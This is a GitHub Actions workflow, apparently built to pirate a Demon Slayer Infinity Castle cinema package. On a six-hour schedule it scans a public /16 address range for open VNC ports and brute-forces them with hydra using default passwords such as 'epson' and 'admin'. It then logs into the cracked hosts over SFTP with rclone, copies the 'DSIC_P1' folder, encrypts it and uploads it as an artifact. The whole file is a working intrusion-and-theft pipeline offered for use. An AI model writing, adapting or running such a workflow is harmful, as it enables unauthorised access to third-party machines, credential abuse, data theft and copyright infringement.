name: Demon Slayer Infinity Castle â€“ DCP Hunter (Ubuntu)

on:
  schedule:
    - cron: '0 */6 * * *'   # every 6 hours
  workflow_dispatch:

jobs:
  hunt:
    runs-on: ubuntu-latest

    steps:
      - name: Install tools
        run: |
          sudo apt-get update -y
          sudo apt-get install -y nmap hydra rclone p7zip-full

      - name: Scan for open VNC
        id: scan
        run: |
          nmap -p5900 --open 210.172.0.0/16 -oG - | awk '/5900\/open/{print $2}' > vnc_hosts.txt
          echo "vnc_count=$(wc -l < vnc_hosts.txt)" >> $GITHUB_OUTPUT

      - name: Brute VNC passwords
        if: steps.scan.outputs.vnc_count != '0'
        run: |
          # create a small, guaranteed-to-exist password list
          printf 'epson\nadmin\nprojector\n123456\n' > ~/pwd.txt
          while read ip; do
            hydra -P ~/pwd.txt vnc://$ip -t 4 -f -o hydra_$ip.txt
            [ -s hydra_$ip.txt ] && echo "$ip" >> valid_ips.txt
          done < vnc_hosts.txt

      - name: Check for valid IPs
        id: valid
        run: echo "found=$([ -s valid_ips.txt ] && echo true || echo false)" >> $GITHUB_OUTPUT

      - name: Download & package DCP
        id: dcp
        if: steps.valid.outputs.found == 'true'
        run: |
          mkdir -p staging
          while read ip; do
            PASS=$(awk '/password:/ {print $NF}' hydra_$ip.txt | head -n1)
            [ -z "$PASS" ] && continue

            # create temp rclone remote
            rclone config create relay$ip sftp \
              host="$ip" user="epson" port="22" \
              --sftp-password "$PASS" \
              --config /tmp/rclone.conf

            # attempt copy
            rclone copy "relay$ip:/DSIC_P1" staging/DSIC_P1 \
              --config /tmp/rclone.conf \
              --transfers=32 -P || continue

            # only set flag if folder is non-empty
            [ -n "$(ls -A staging/DSIC_P1)" ] && {
              7z a -pInfinity2025 -mhe=on DSIC_P1.7z staging/DSIC_P1
              echo "movie_found=true" >> $GITHUB_OUTPUT
              break
            }
          done < valid_ips.txt
          
      - name: Upload artifact
        if: steps.dcp.outputs.movie_found == 'true'
        uses: actions/upload-artifact@v4
        with:
          name: DSIC_P1
          path: DSIC_P1.7z
          retention-days: 7

      - name: Signal success
        if: steps.dcp.outputs.movie_found == 'true'
        run: echo "movie found and downloaded"
